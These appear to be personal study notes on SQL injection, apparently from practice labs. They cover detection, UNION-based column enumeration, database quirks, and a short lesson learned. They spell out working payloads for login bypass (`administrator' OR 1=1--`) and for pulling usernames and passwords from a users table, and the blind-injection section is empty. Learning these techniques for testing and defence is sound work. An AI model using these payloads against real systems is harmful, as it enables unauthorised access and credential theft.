# SQL Injection Notes

## Detection Techniques

1. **Simple Injection**: Use a single quote (`'`) to test for SQL errors.
2. **Adding Logic**: Inject logic after a single quote, e.g., `' AND 1=1--` or `'--`.
3. **Time-Based Attacks**: Observe response times to detect delays caused by SQL queries.
4. **OAST (Out-of-Band Application Security Testing)**: Utilize external interactions to detect vulnerabilities.

---

## Union-Based Attacks

### Key Considerations
- The number and type of columns in the `UNION` query must match the original query.

### Determining the Number of Columns
1. Use `' ORDER BY 1--` and increment numbers until you see an "out of index" error.
   - Note: Index starts from 1.
2. Use `' UNION SELECT NULL--`:
   - If there’s a mismatch, an error is returned.
   - If there’s no mismatch, NULL values will populate the rows.

#### Example Queries
- `' ORDER BY 1--`: Returns an error if the number exceeds available rows.
- `' UNION SELECT NULL,NULL,NULL--`: Returns an additional row with NULL values if columns match.

---

## Tricks and Examples

### Basic Bypasses
- Example 1: `administrator' OR 1=1--`
- Example 2: `' UNION SELECT USER,PASS FROM users--`
- Example 3: `' UNION SELECT NULL,USER || PASS FROM users--`

### Practical Attacks
- `/filter?category=P'UNION SELECT NULL,password_mwoxri FROM users_iktcia--`
- `/filter?category=P'UNION SELECT NULL,TABLE_NAME FROM information_schema.columns WHERE COLUMN_NAME = 'rolbypassrls'--`

### Column Concatenation
- If only one column is a string, concatenate values:
  - Example: `' UNION SELECT NULL,USER || PASS FROM users--`

---

## Blind SQL Injection

### Example
- Tracking ID Example:

---

## Tips and Lessons

1. **Database-Specific Quirks**:
 - **Oracle**: Always requires a `FROM` clause in `SELECT`.
 - **MySQL**: Use `%20` for spaces after comments.
2. **Query Structure**:
 - After `SELECT`: Always a column name.
 - After `FROM`: Always a table name.
 - Example: `WHERE column_name = something`.

3. **Key Observations**:
 - Spaces and syntax quirks significantly affect results.
 - Always verify queries with a condition like `column_name = value` to confirm accuracy.

---

## Hard Lesson Learned
- After two hours of testing: 
- Syntax and spacing quirks can dramatically influence results.
- Without a proper comparison (e.g., `letter = value`), conclusions are unreliable.
